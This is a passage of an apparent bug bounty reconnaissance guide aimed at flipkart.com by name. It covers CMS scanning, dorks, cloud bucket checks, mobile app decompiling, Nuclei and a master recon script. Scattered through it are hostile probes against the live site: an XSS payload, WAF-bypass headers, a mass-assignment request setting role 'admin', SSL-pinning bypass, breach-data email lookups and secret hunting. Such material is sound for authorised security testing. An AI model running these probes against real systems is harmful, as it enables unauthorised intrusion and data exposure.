- **WordPress** → See Phase 14
- **Nginx** → Path normalization, misconfigured proxy
- **Apache** → .htaccess tricks, mod_status

---

## 14. Phase 12 — CMS Detection

### 14.1 WordPress Detection & WPScan

```bash
# Detect WordPress
curl -s https://blog.flipkart.com | grep -i "wp-content\|wp-includes\|wordpress"

# WPScan — comprehensive WordPress audit
wpscan --url https://blog.flipkart.com \
  --enumerate u,p,t,vp,vt,tt,cb,dbe \
  --api-token YOUR_WPSCAN_API_TOKEN \
  -o $OUTDIR/cms/wpscan_blog.txt

# Enumerate options explained:
# u  → users
# p  → plugins
# t  → themes
# vp → vulnerable plugins only
# vt → vulnerable themes only
# tt → timthumbs
# cb → config backups
# dbe → database exports

# Aggressive plugin scan
wpscan --url https://blog.flipkart.com \
  --plugins-detection aggressive \
  --api-token YOUR_TOKEN

# Check common WordPress paths
for path in /wp-login.php /wp-admin /wp-config.php /xmlrpc.php /wp-json/wp/v2/users /readme.html /license.txt; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://blog.flipkart.com$path")
  echo "$code → https://blog.flipkart.com$path"
done
```

### 14.2 CMSeeK — Multi-CMS Detection

```bash
python3 ~/tools/CMSeeK/cmseek.py -u https://www.flipkart.com --follow-redirect

# Supports: WordPress, Drupal, Joomla, Magento, Prestashop, OpenCart,
#           Typo3, Craft CMS, Sitefinity, DotNetNuke, and 160+ others
```

### 14.3 Drupal Specific

```bash
# Detect Drupal
curl -sk https://example.com/CHANGELOG.txt | head -5
curl -sk https://example.com/core/CHANGELOG.txt | head -5

# Droopescan
pip3 install droopescan
droopescan scan drupal -u https://example.com
```

### 14.4 Joomla Specific

```bash
# JoomScan
git clone https://github.com/OWASP/joomscan.git
perl joomscan.pl -u https://example.com
```

### 14.5 Magento Specific

```bash
# Magescan
php magescan.phar scan:all https://example.com

# Check for common Magento paths
curl -sk https://example.com/downloader/ | grep -i "magento"
curl -sk https://example.com/admin/ | grep -i "magento"
```

---

## 15. Phase 13 — Google Dorks & OSINT

### 15.1 Core Google Dorks for flipkart.com

```
# Find subdomains
site:*.flipkart.com

# Exclude www, find dev/staging
site:*.flipkart.com -www

# Find login pages
site:flipkart.com inurl:login OR inurl:signin OR inurl:admin

# Find API documentation
site:flipkart.com inurl:api OR inurl:docs OR inurl:swagger OR inurl:openapi

# Find exposed files
site:flipkart.com ext:pdf OR ext:doc OR ext:xls

# Find config/backup files
site:flipkart.com ext:env OR ext:config OR ext:bak OR ext:old OR ext:sql

# Find phpinfo
site:flipkart.com inurl:phpinfo.php

# Find error pages with stack traces
site:flipkart.com "Warning: " "on line" "PHP"
site:flipkart.com "SQL syntax" OR "mysql_num_rows" OR "ORA-"

# Find exposed .git
site:flipkart.com inurl:.git

# Find robots.txt
site:flipkart.com inurl:robots.txt

# Find parameters with IDs (IDOR hunting)
site:flipkart.com inurl:"id=" OR inurl:"user=" OR inurl:"order="

# Find internal tools
site:flipkart.com intitle:"Jenkins" OR intitle:"Jira" OR intitle:"Grafana"

# Find email addresses
"@flipkart.com" filetype:csv OR filetype:xls

# Find AWS resources
site:s3.amazonaws.com "flipkart"
site:blob.core.windows.net "flipkart"

# Old cache of removed pages
cache:flipkart.com/internal

# Pastebin leaks
site:pastebin.com "flipkart.com"
site:paste.ee "flipkart"
site:ghostbin.com "flipkart"
```

### 15.2 Shodan Dorks

```
# Find all Flipkart IPs
org:"Flipkart Internet Private Limited"
org:"Flipkart" country:"IN"

# Find specific services
org:"Flipkart" port:6379     # Redis
org:"Flipkart" port:9200     # Elasticsearch
org:"Flipkart" port:27017    # MongoDB
org:"Flipkart" port:2375     # Docker daemon

# Find exposed admin panels
http.title:"flipkart" http.status:200

# SSL cert search
ssl.cert.subject.cn:"*.flipkart.com"
```

### 15.3 GitHub Dorks

```
# Directly in GitHub search:
"flipkart.com" password
"flipkart" api_key language:python
"flipkart" secret_key filename:.env
"flipkart" db_password
"flipkart.com" aws_access_key_id
org:flipkart-incubator
```

### 15.4 GitDorker Automation

```bash
python3 ~/tools/GitDorker/GitDorker.py \
  -tf ~/tools/GitDorker/Dorks/alldorks.txt \
  -q flipkart.com \
  -d flipkart.com \
  -o $OUTDIR/github/gitdorker_results.txt
```

---

## 16. Phase 14 — Certificate Transparency Logs

### 16.1 Multiple CT Log Sources

```bash
# crt.sh (already covered)
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=$TARGET&include_subdomains=true&expand=dns_names" \
  | jq -r '.[].dns_names[]' | sort -u

# Facebook CT logs
curl -s "https://developers.facebook.com/tools/ct/search/affiliates/?query=$TARGET" | jq '.results[].affiliations[]'

# censys CT
curl -s "https://search.censys.io/api/v1/search/certificates" \
  -H "Authorization: Basic BASE64_KEY" \
  -d '{"query":"parsed.names: flipkart.com"}' | jq -r '.results[].parsed.names[]'

# TLSX — TLS certificate grabber
echo "$TARGET" | tlsx -san -cn -silent | tee $OUTDIR/subdomains/tlsx.txt
tlsx -l $OUTDIR/ips_from_dns.txt -san -cn -silent | tee $OUTDIR/subdomains/tlsx_ips.txt
```

### 16.2 Certificate Analysis Tips

```bash
# Find wildcard certs (indicates many subdomains)
cat $OUTDIR/subdomains/crtsh.txt | grep "^\*\." | sort -u

# Find internal/dev patterns
cat $OUTDIR/subdomains/all_subdomains_clean.txt | grep -E "(dev|staging|test|uat|qa|preprod|internal|corp|vpn|admin)" | tee $OUTDIR/subdomains/interesting_subs.txt

# Find new subdomains added recently (monitor CT logs)
# Use certstream for real-time monitoring:
pip3 install certstream
# certstream monitors all new SSL certs issued and alerts on your domain
```

---

## 17. Phase 15 — Wayback Machine & Historical Data

### 17.1 Comprehensive URL Collection

```bash
# Waybackurls
waybackurls $TARGET | tee $OUTDIR/urls/wayback.txt

# GAU with all providers
gau --providers wayback,commoncrawl,otx,urlscan --threads 10 $TARGET | tee $OUTDIR/urls/gau.txt

# Common Crawl specifically
curl -s "http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.flipkart.com&output=json" | \
  jq -r '.url' | sort -u | tee $OUTDIR/urls/commoncrawl.txt
```

### 17.2 Mining Historical URLs for Gold

```bash
ALL_URLS=$OUTDIR/urls/all_urls.txt

# Find old API endpoints (might still work)
cat $ALL_URLS | grep -E "/api/v[0-9]" | sort -u | tee $OUTDIR/urls/old_api_endpoints.txt

# Find backup files ever exposed
cat $ALL_URLS | grep -E "\.(bak|old|backup|zip|tar|gz|sql|dump|log)$" | sort -u | tee $OUTDIR/urls/backup_files.txt

# Find config files
cat $ALL_URLS | grep -E "\.(env|config|conf|cfg|yml|yaml|json|xml)$" | sort -u | tee $OUTDIR/urls/config_files.txt

# Find upload endpoints (historically exposed)
cat $ALL_URLS | grep -iE "(upload|file|import|export|download|attach)" | sort -u | tee $OUTDIR/urls/upload_endpoints.txt

# Find PHP files with parameters
cat $ALL_URLS | grep "\.php?" | sort -u | tee $OUTDIR/urls/php_with_params.txt

# Find endpoints with interesting parameter names
cat $ALL_URLS | grep -iE "[?&](id|user|account|order|token|key|secret|debug|test|admin)=" | sort -u | tee $OUTDIR/urls/interesting_params.txt

# Check if old URLs are still alive
cat $OUTDIR/urls/backup_files.txt | httpx -silent -mc 200 | tee $OUTDIR/urls/alive_backup_files.txt
```

### 17.3 Wayback Snapshot Analysis

```bash
# Get a specific historical page snapshot
curl -s "http://web.archive.org/web/20200101000000*/flipkart.com/sitemap.xml" | grep -oP "\d{14}" | sort -r | head -10

# Fetch specific snapshot
curl -s "https://web.archive.org/web/20200601120000/https://flipkart.com/internal-dashboard"

# Find deleted robots.txt
curl -s "https://web.archive.org/web/2020*/https://flipkart.com/robots.txt" | grep "disallow" -i
```

---

## 18. Phase 16 — GitHub & Code Leaks

### 18.1 GitHub Organization Recon

```bash
# Find org repos
curl -s "https://api.github.com/orgs/flipkart-incubator/repos?per_page=100" | jq -r '.[].html_url'

# Clone all public repos for analysis
curl -s "https://api.github.com/orgs/flipkart-incubator/repos?per_page=100" | \
  jq -r '.[].clone_url' | while read repo; do
  git clone --depth=1 "$repo" 2>/dev/null
done

# Search commits for secrets
trufflehog github --org=flipkart-incubator --only-verified

# Search across all of GitHub
trufflehog github --repo=https://github.com/flipkart-incubator/REPO --since-commit=HEAD~100
```

### 18.2 Git History Mining

```bash
# On a cloned repo, search git history
git log --all --full-history --oneline

# Search all commits for keywords
git grep -i "password\|secret\|api_key\|token\|credential" $(git log --all --format='%H')

# Find deleted files in history
git log --all --full-history -- "*password*" "*secret*" "*config*"

# Use gitLeaks for automated detection
go install github.com/gitleaks/gitleaks/v8@latest
gitleaks detect --source /path/to/repo -v --report-format json --report-path $OUTDIR/github/gitleaks.json
```

### 18.3 Exposed .git Directories on Web

```bash
# Check if .git directory is exposed on web
curl -s https://www.flipkart.com/.git/HEAD | grep -i "ref:"

# If exposed, reconstruct repo
go install github.com/internetwache/GitTools/Dumper@latest
git-dumper https://www.flipkart.com/.git/ $OUTDIR/git_dump/
```

---

## 19. Phase 17 — Cloud & S3 Bucket Recon

### 19.1 AWS S3 Bucket Enumeration

```bash
# cloud_enum — find cloud resources across AWS, Azure, GCP
python3 ~/tools/cloud_enum/cloud_enum.py \
  -k flipkart \
  -k fkart \
  -k flipkart-media \
  -k flipkart-static \
  --disable-azure --disable-gcp \
  -o $OUTDIR/cloud/cloud_enum.txt

# s3scanner
s3scanner scan --bucket-file $OUTDIR/cloud/bucket_names.txt

# Generate bucket name variations
cat > $OUTDIR/cloud/bucket_names.txt << 'EOF'
flipkart
flipkart-static
flipkart-media
flipkart-images
flipkart-uploads
flipkart-backup
flipkart-dev
flipkart-staging
flipkart-logs
flipkart-assets
fk-static
fk-media
fkart
EOF

# Check each bucket directly
while read bucket; do
  response=$(curl -sk "https://$bucket.s3.amazonaws.com/" -o /dev/null -w "%{http_code}")
  echo "$response → $bucket.s3.amazonaws.com"
done < $OUTDIR/cloud/bucket_names.txt

# Check if bucket is listable
aws s3 ls s3://flipkart-static 2>/dev/null | head -20
```

### 19.2 GCP, Azure Cloud Discovery

```bash
# GCP buckets
curl -sk "https://storage.googleapis.com/flipkart-media/"
curl -sk "https://storage.googleapis.com/flipkart-static/"

# Azure blobs
curl -sk "https://flipkart.blob.core.windows.net/assets/"
curl -sk "https://flipkart.blob.core.windows.net/images/"

# Full cloud enum with both
python3 ~/tools/cloud_enum/cloud_enum.py -k flipkart
```

### 19.3 Firebase Recon

```bash
# Common Firebase patterns
curl -sk "https://flipkart-app.firebaseio.com/.json" | head -100
curl -sk "https://flipkart.firebaseio.com/.json?shallow=true"

# Firebase rules check (is the DB open?)
curl -sk "https://PROJECT.firebaseio.com/.settings/rules.json"
```

---

## 20. Phase 18 — Email & OSINT

### 20.1 Email Discovery

```bash
# theHarvester — gather emails, names, IPs, subdomains
theHarvester -d flipkart.com -b all -f $OUTDIR/osint/harvester_output

# hunter.io (web) — find emails for domain

# h8mail — check breaches
pip3 install h8mail
h8mail -t "@flipkart.com" -o $OUTDIR/osint/h8mail_results.txt
```

### 20.2 LinkedIn OSINT

```bash
# Find employees via LinkedIn (manual)
# Search: site:linkedin.com/in "flipkart" "security engineer"
# Search: site:linkedin.com/in "flipkart" "developer"

# Employees → get their GitHub → find private repos with secrets
# Employees → get their email format (first.last@flipkart.com)
# → use for credential stuffing databases check
```

### 20.3 Breach Data Check

```bash
# Check haveibeenpwned for domain
curl -sk "https://haveibeenpwned.com/api/v3/breachesdomain/flipkart.com" \
  -H "hibp-api-key: YOUR_KEY" | jq '.'

# DeHashed check
curl -sk "https://api.dehashed.com/search?query=email:@flipkart.com" \
  -H "Authorization: Basic BASE64_KEY" | jq '.entries[].email'
```

---

## 21. Phase 19 — WAF & CDN Fingerprinting

### 21.1 WAF Detection

```bash
# wafw00f — detect WAF
wafw00f https://www.flipkart.com -v | tee $OUTDIR/tech/waf.txt

# httpx WAF detection via response headers
curl -sk -I https://www.flipkart.com | grep -iE "(x-cache|x-cdn|cf-ray|x-akamai|x-sucuri|server|x-powered-by|x-amz)"

# Common WAF signatures in headers:
# cf-ray: → Cloudflare
# X-Cache: → Akamai/Fastly/Varnish
# X-Amz-Cf-Id: → AWS CloudFront
# Server: AkamaiGHost → Akamai
# Server: cloudflare → Cloudflare

# Manual WAF test — send a malicious payload and check response
curl -sk "https://www.flipkart.com/?test=<script>alert(1)</script>" | head -30
```

### 21.2 WAF Bypass Techniques After Detection

```bash
# If Cloudflare detected → find the real IP behind it
# 1. Check historical DNS in SecurityTrails
# 2. Check crt.sh for other domains on same cert → same IP
# 3. Check Shodan for org:"Flipkart" → direct IP access
# 4. Try: curl -H "Host: www.flipkart.com" http://REAL_IP/

# Test bypass with origin headers
curl -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" https://www.flipkart.com/admin

# Case manipulation, encoding bypass
curl "https://www.flipkart.com/admin%2fpanel"
curl "https://www.flipkart.com/ADMIN"
```

---

## 22. Phase 20 — API Discovery

### 22.1 API Endpoint Discovery

```bash
# Find Swagger/OpenAPI docs
for path in /swagger.json /swagger.yaml /openapi.json /openapi.yaml \
  /api-docs /v1/api-docs /v2/api-docs /api/swagger.json \
  /swagger/index.html /swagger-ui.html /redoc; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://api.flipkart.com$path")
  [[ "$code" == "200" ]] && echo "FOUND: https://api.flipkart.com$path"
done

# Find GraphQL endpoints
for path in /graphql /graphiql /api/graphql /v1/graphql /graph; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://www.flipkart.com$path")
  [[ "$code" == "200" ]] && echo "FOUND GraphQL: https://www.flipkart.com$path"
done

# Introspect GraphQL (if found)
curl -sk -X POST https://api.flipkart.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name}}}}"}' | jq '.data.__schema.types[].name'
```

### 22.2 API Version Discovery

```bash
# Try multiple API versions
for version in v1 v2 v3 v4 v5 api 1 2 3; do
  for base in api api2 api-v $version; do
    url="https://${base}.flipkart.com"
    code=$(curl -sk -o /dev/null -w "%{http_code}" "$url")
    [[ "$code" != "000" && "$code" != "404" ]] && echo "$code → $url"
  done
done
```

### 22.3 REST API Testing

```bash
# Check for CORS misconfiguration
curl -sk -H "Origin: https://evil.com" -I https://api.flipkart.com/products | grep -i "access-control"

# Check for HTTP method spoofing
curl -sk -X GET -H "X-HTTP-Method-Override: PUT" https://api.flipkart.com/users/123

# Check for mass assignment
curl -sk -X PUT https://api.flipkart.com/users/me \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "role": "admin", "email": "test@test.com"}'
```

---

## 23. Phase 21 — Mobile App Recon

### 23.1 Android APK Analysis

```bash
# Download APK (from APKPure, APKMirror, or the Play Store via apkeep)
pip3 install apkeep
apkeep -a com.flipkart.android -d .

# Decompile with jadx
jadx -d $OUTDIR/apk/flipkart_decompiled/ flipkart.apk

# Find hardcoded URLs and API endpoints
grep -r "api\|https://" $OUTDIR/apk/flipkart_decompiled/ | grep -v ".class:" | tee $OUTDIR/apk/endpoints.txt

# Find hardcoded secrets
grep -rE "(api_key|apikey|secret|password|token|firebase|aws|google)" $OUTDIR/apk/flipkart_decompiled/ | tee $OUTDIR/apk/secrets.txt

# Extract strings from APK
apktool d flipkart.apk -o $OUTDIR/apk/apktool/
cat $OUTDIR/apk/apktool/res/values/strings.xml

# Check AndroidManifest.xml for exposed activities, deep links
cat $OUTDIR/apk/apktool/AndroidManifest.xml | grep -E "(exported|intent-filter|scheme)"
```

### 23.2 iOS IPA Analysis

```bash
# Download IPA (from AppStore via ipatool)
ipatool download -b com.flipkart.app

# Unzip IPA
unzip flipkart.ipa -d $OUTDIR/ipa/

# Find endpoints
grep -r "https://" $OUTDIR/ipa/ --include="*.plist" | sort -u

# Check Info.plist
cat $OUTDIR/ipa/Payload/Flipkart.app/Info.plist | grep -A2 "NSApp\|URL\|scheme"
```

### 23.3 Traffic Interception Setup

```bash
# Set up Burp Suite proxy → intercept mobile traffic
# Install Burp cert on device
# Use ProxyDroid (Android) or Settings → Wifi → Proxy (iOS)

# For certificate pinning bypass:
# Frida
pip3 install frida-tools
frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida \
  -f com.flipkart.android

# Or use objection
pip3 install objection
objection -g com.flipkart.android explore
```

---

## 24. Phase 22 — Shodan, Censys & FOFA

### 24.1 Shodan

```bash
# CLI setup
pip3 install shodan
shodan init YOUR_API_KEY

# Search by org
shodan search 'org:"Flipkart Internet Private Limited"' --fields ip_str,port,product,version | tee $OUTDIR/cloud/shodan_results.txt

# Search by SSL cert
shodan search 'ssl.cert.subject.cn:"*.flipkart.com"' --fields ip_str,port,product

# Search for specific vulnerable services
shodan search 'org:"Flipkart" port:6379'   # Redis
shodan search 'org:"Flipkart" port:9200'   # Elasticsearch
shodan search 'org:"Flipkart" http.title:"Jenkins"'
shodan search 'org:"Flipkart" http.title:"Grafana"'

# Fetch details of specific IP
shodan host 13.127.98.74 | jq '.'
```

### 24.2 Censys

```bash
# Initialize
censys config  # set API credentials

# Search certificates
censys search 'parsed.names: flipkart.com' --index-type certs | jq '.'

# Search hosts
censys search 'autonomous_system.name:"Flipkart"' --index-type ipv4 | jq '.results[].ip'

# Web interface: https://search.censys.io/
# certificates: parsed.names:"flipkart.com"
# hosts: services.tls.certificates.leaf_data.names="flipkart.com"
```

### 24.3 FOFA (Chinese Search Engine)

```bash
# Web: https://fofa.info
# Query: domain="flipkart.com"
# Query: cert="flipkart.com"
# Query: org="Flipkart Internet Private Limited"
```

---

## 25. Phase 23 — Nuclei — Automated Vuln Scanning

### 25.1 Core Nuclei Usage

```bash
# Update templates first
nuclei -update-templates

# Scan all live hosts with all templates
nuclei -l $OUTDIR/live_urls.txt -o $OUTDIR/nuclei/results.txt

# Scan with specific severity
nuclei -l $OUTDIR/live_urls.txt \
  -severity critical,high \
  -o $OUTDIR/nuclei/critical_high.txt

# Scan with specific categories
nuclei -l $OUTDIR/live_urls.txt \
  -t exposures/ \
  -t vulnerabilities/ \
  -t misconfiguration/ \
  -t cves/ \
  -o $OUTDIR/nuclei/focused.txt

# Technology-specific scanning
nuclei -l $OUTDIR/live_urls.txt -t technologies/wordpress/ -o $OUTDIR/nuclei/wordpress.txt
nuclei -l $OUTDIR/live_urls.txt -t technologies/jenkins/ -o $OUTDIR/nuclei/jenkins.txt
nuclei -l $OUTDIR/live_urls.txt -t technologies/elasticsearch/ -o $OUTDIR/nuclei/elastic.txt

# Scan with tags
nuclei -l $OUTDIR/live_urls.txt -tags sqli,xss,ssrf,lfi,rce -o $OUTDIR/nuclei/vuln_classes.txt

# Rate limited scan (be respectful)
nuclei -l $OUTDIR/live_urls.txt -rate-limit 50 -c 10 -o $OUTDIR/nuclei/limited.txt
```

### 25.2 Custom Nuclei Templates

```yaml
# Save as ~/nuclei-templates/custom/flipkart-debug.yaml
id: flipkart-debug-endpoint

info:
  name: Flipkart Debug Endpoint Check
  author: YourHandle
  severity: medium
  tags: debug,disclosure

requests:
  - method: GET
    path:
      - "{{BaseURL}}/debug"
      - "{{BaseURL}}/debug/info"
      - "{{BaseURL}}/actuator"
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/actuator/health"
      - "{{BaseURL}}/actuator/mappings"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "spring"
          - "actuator"
          - "system properties"
        condition: or
      - type: status
        status:
          - 200
```

```bash
# Run custom templates
nuclei -l $OUTDIR/live_urls.txt -t ~/nuclei-templates/custom/ -o $OUTDIR/nuclei/custom.txt
```

---

## 26. Phase 24 — Robots.txt, Sitemap.xml & Security.txt

### 26.1 Robots.txt Analysis

```bash
# Fetch robots.txt for all live hosts
while read url; do
  curl -sk "${url}/robots.txt" | grep -iE "^(disallow|allow):" | tee -a $OUTDIR/robots_combined.txt
  echo "--- $url ---" >> $OUTDIR/robots_combined.txt
done < $OUTDIR/live_urls.txt

# Extract all disallowed paths (devs hide juicy paths here!)
cat $OUTDIR/robots_combined.txt | grep -i "disallow" | awk '{print $2}' | sort -u | tee $OUTDIR/disallowed_paths.txt

# Test if disallowed paths are actually accessible
while read path; do
  [[ -z "$path" ]] && continue
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://www.flipkart.com$path")
  echo "$code → https://www.flipkart.com$path"
done < $OUTDIR/disallowed_paths.txt
```

**Pro tip:** Disallowed paths in robots.txt are like a breadcrumb trail to hidden functionality. Always check every single one.

### 26.2 Sitemap.xml

```bash
# Fetch sitemap
curl -sk https://www.flipkart.com/sitemap.xml | tee $OUTDIR/sitemap.xml

# Handle sitemap index (multiple sitemaps)
curl -sk https://www.flipkart.com/sitemap_index.xml | grep -oP "https?://[^\<]+" | tee $OUTDIR/sitemap_urls.txt

# Download all sitemaps
while read sitemap_url; do
  curl -sk "$sitemap_url" | grep -oP "https?://[^\<]+" >> $OUTDIR/sitemap_all_urls.txt
done < $OUTDIR/sitemap_urls.txt

# Add sitemap URLs to main URL list
cat $OUTDIR/sitemap_all_urls.txt | anew $OUTDIR/urls/all_urls.txt

echo "[*] Sitemap gave us: $(wc -l < $OUTDIR/sitemap_all_urls.txt) URLs"
```

### 26.3 Security.txt

```bash
# RFC 9116 — find responsible disclosure info
curl -sk https://www.flipkart.com/.well-known/security.txt
curl -sk https://www.flipkart.com/security.txt

# Contains: contact email, PGP key, scope, preferred languages
# Also check: /.well-known/security.txt
```

### 26.4 Other Well-Known Paths

```bash
for path in \
  /.well-known/security.txt \
  /.well-known/change-password \
  /.well-known/openid-configuration \
  /.well-known/oauth-authorization-server \
  /.well-known/assetlinks.json \
  /.well-known/apple-app-site-association \
  /crossdomain.xml \
  /clientaccesspolicy.xml \
  /browserconfig.xml \
  /manifest.json \
  /sw.js \
  /service-worker.js; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://www.flipkart.com$path")
  [[ "$code" == "200" ]] && echo "FOUND: https://www.flipkart.com$path"
done
```

---

## 27. Phase 25 — Virtual Host (VHost) Discovery

### 27.1 VHost Bruteforce

```bash
# Find virtual hosts — same IP, different subdomains not in DNS
# First get the real IP of the server
SERVER_IP=$(dig +short www.flipkart.com | tail -1)

# Fuzz with ffuf using Host header
ffuf -w ~/recon/wordlists/subdomains.txt \
  -u "https://$SERVER_IP" \
  -H "Host: FUZZ.flipkart.com" \
  -mc 200,204,301,302 \
  -fs [default_response_size] \
  -o $OUTDIR/vhosts/vhost_discovery.json

# With gobuster
gobuster vhost \
  -u "https://$SERVER_IP" \
  -w ~/recon/wordlists/subdomains.txt \
  -H "Host: FUZZ.flipkart.com" \
  --append-domain
```

---

## 28. Phase 26 — Source Code Review Signals

### 28.1 What to Look for in Responses

```bash
# Check HTML comments for sensitive info
curl -sk https://www.flipkart.com | grep -oP "<!--.*?-->" | grep -iv "DOCTYPE\|[<{]" | head -50

# Find hidden form fields
curl -sk https://www.flipkart.com | grep -i 'type="hidden"'

# Find meta generator tags (CMS version)
curl -sk https://www.flipkart.com | grep -i "meta name.*generator"

# Find inline JS variables with sensitive data
curl -sk https://www.flipkart.com | grep -oP "var \w+ = ['\"]{[^}]+}['\"]" | head -30

# Check HTTP response headers for sensitive data
curl -skI https://www.flipkart.com | grep -iE "(x-powered-by|server|x-aspnet|x-debug|x-runtime|x-version|x-env)"
```

### 28.2 Source Code Signals Cheat Sheet

| Signal | Location | Indicates |
|--------|----------|-----------|
| `<!-- BEGIN ADMIN -->` | HTML comments | Admin interface exists |
| `var config = {apiKey: "..."}` | Inline JS | Hardcoded key |
| `type="hidden" name="userId"` | HTML forms | IDOR potential |
| `X-Powered-By: Express` | Headers | Node.js Express |
| `Set-Cookie: JSESSIONID` | Headers | Java backend |
| `generator: WordPress 5.9` | Meta tags | WP version |
| `@import url(https://fonts.goog` | CSS | CSP bypass possible |
| `window.__INITIAL_STATE__=` | Inline JS | State data leak |
| `/* DEBUG MODE */` | JS comments | Debug code in prod |
| `PHPSESSID` | Cookies | PHP backend |

---

## 29. Master Sorting & Organization System

### 29.1 The Master Recon Pipeline — Run Order

```bash
#!/bin/bash
# master_recon.sh — Run this on any target

TARGET=$1
OUTDIR=~/recon/targets/$TARGET
mkdir -p $OUTDIR/{subdomains,dns,ports,urls,js,params,screenshots,nuclei,cloud,tech,osint,cms,github,apk,ipa,robots,vhosts}

echo "[*] Starting recon on $TARGET at $(date)"

# === PHASE 1: SUBDOMAINS ===
echo "[*] Phase 1: Subdomain Enumeration"
subfinder -d $TARGET -silent -all | anew $OUTDIR/subdomains/subfinder.txt
assetfinder --subs-only $TARGET | anew $OUTDIR/subdomains/assetfinder.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew $OUTDIR/subdomains/crtsh.txt
amass enum -passive -d $TARGET | anew $OUTDIR/subdomains/amass.txt

cat $OUTDIR/subdomains/*.txt | sort -u > $OUTDIR/subdomains/all_raw.txt

# === PHASE 2: DNS RESOLUTION ===
echo "[*] Phase 2: DNS Resolution"
puredns resolve $OUTDIR/subdomains/all_raw.txt \
  --resolvers ~/recon/wordlists/resolvers.txt \
  -w $OUTDIR/subdomains/resolved.txt

dnsx -l $OUTDIR/subdomains/resolved.txt -a -resp-only -silent | sort -u > $OUTDIR/dns/all_ips.txt
dnsx -l $OUTDIR/subdomains/resolved.txt -cname -resp -silent > $OUTDIR/dns/cnames.txt

# === PHASE 3: HTTP PROBING ===
echo "[*] Phase 3: HTTP Probing"
cat $OUTDIR/subdomains/resolved.txt | httpx \
  -status-code -title -tech-detect -server \
  -follow-redirects -threads 50 \
  -json -o $OUTDIR/httpx_full.json 2>/dev/null

cat $OUTDIR/httpx_full.json | jq -r '.url' | sort -u > $OUTDIR/live_urls.txt

# === PHASE 4: URL COLLECTION ===
echo "[*] Phase 4: URL Collection"
gau --providers wayback,commoncrawl,otx,urlscan $TARGET | anew $OUTDIR/urls/gau.txt
waybackurls $TARGET | anew $OUTDIR/urls/wayback.txt
katana -list $OUTDIR/live_urls.txt -jc -d 3 -silent | anew $OUTDIR/urls/katana.txt

cat $OUTDIR/urls/*.txt | sort -u | uro > $OUTDIR/urls/all_urls.txt

# === PHASE 5: CLASSIFY URLs ===
echo "[*] Phase 5: Classifying URLs"
cat $OUTDIR/urls/all_urls.txt | gf xss > $OUTDIR/params/xss.txt
cat $OUTDIR/urls/all_urls.txt | gf sqli > $OUTDIR/params/sqli.txt
cat $OUTDIR/urls/all_urls.txt | gf ssrf > $OUTDIR/params/ssrf.txt
cat $OUTDIR/urls/all_urls.txt | gf lfi > $OUTDIR/params/lfi.txt
cat $OUTDIR/urls/all_urls.txt | gf redirect > $OUTDIR/params/redirect.txt

# === PHASE 6: JS ANALYSIS ===
echo "[*] Phase 6: JavaScript Analysis"
cat $OUTDIR/urls/all_urls.txt | grep "\.js$" | sort -u > $OUTDIR/js/js_files.txt
mkdir -p $OUTDIR/js/downloaded
cat $OUTDIR/js/js_files.txt | while read url; do
  fn=$(echo $url | md5sum | cut -d' ' -f1).js
  curl -sk "$url" > $OUTDIR/js/downloaded/$fn
done

# === PHASE 7: NUCLEI ===
echo "[*] Phase 7: Nuclei Scan"
nuclei -l $OUTDIR/live_urls.txt \
  -severity critical,high,medium \
  -t exposures/ -t vulnerabilities/ -t misconfiguration/ \
  -o $OUTDIR/nuclei/results.txt \
  -silent

echo "[*] Recon complete at $(date)"
echo "[*] Summary:"
echo "    Subdomains: $(wc -l < $OUTDIR/subdomains/all_raw.txt)"
echo "    Resolved:   $(wc -l < $OUTDIR/subdomains/resolved.txt)"
echo "    Live hosts: $(wc -l < $OUTDIR/live_urls.txt)"
echo "    Total URLs: $(wc -l < $OUTDIR/urls/all_urls.txt)"
```

### 29.2 Sorting & Prioritizing Findings

```bash
# Sort live hosts by interesting titles (login panels, admin etc.)
cat $OUTDIR/httpx_full.json | jq -r 'select(.title | test("login|admin|dashboard|panel|portal|manage|internal|jenkins|grafana|kibana"; "i")) | "\(.title) → \(.url)"' | sort | tee $OUTDIR/priority_targets.txt

# Sort by technology (PHP is most interesting for SQLi/LFI)
cat $OUTDIR/httpx_full.json | jq -r 'select(.tech[]? | test("PHP"; "i")) | .url' | sort -u | tee $OUTDIR/php_hosts.txt

# Sort by status code — 403s for bypass, 401s for auth bypass
cat $OUTDIR/httpx_full.json | jq -r 'select(.status_code == 403) | .url' | tee $OUTDIR/sorted/403_hosts.txt
cat $OUTDIR/httpx_full.json | jq -r 'select(.status_code == 401) | .url' | tee $OUTDIR/sorted/401_hosts.txt

# Find unique parameters across all URLs
cat $OUTDIR/urls/all_urls.txt | grep "?" | sed 's/=.*/=/g' | sort -u | grep -oP "[?&]\K[^=]+" | sort | uniq -c | sort -rn | tee $OUTDIR/params/param_frequency.txt
```

---

## 30. How Top Hunters Use Recon Data

### 30.1 The Elite Workflow

**Tier 1 hunters don't just collect data — they correlate it:**

```
Subdomain: dev-api.flipkart.com  [from CT logs, not in DNS]
  ↓ probe it → 200 OK, Swagger UI exposed
  ↓ look at Swagger → /v2/users/{id} endpoint
  ↓ test with IDs 1,2,3 → IDOR, can see all user data
  → P1 CRITICAL
```

```
Old URL from Wayback: /admin/debug/dump_database [returned 200 in 2019]
  ↓ still exists today → direct database dump exposed
  → P1 CRITICAL
```

```
GitHub search → dev found config file with internal staging URL
  ↓ staging.internal.flipkart.com → no auth required
  ↓ runs unpatched Rails 4.1 → mass assignment vuln
  → P1 HIGH
```

### 30.2 Bug Classes and Their Recon Source

| Bug Class | Primary Recon Source | Pivot To |
|-----------|---------------------|----------|
| **Subdomain Takeover** | CT Logs, Subfinder → DNS CNAME | Subjack verification |
| **IDOR** | URL crawling, Param discovery | Manual + Arjun |
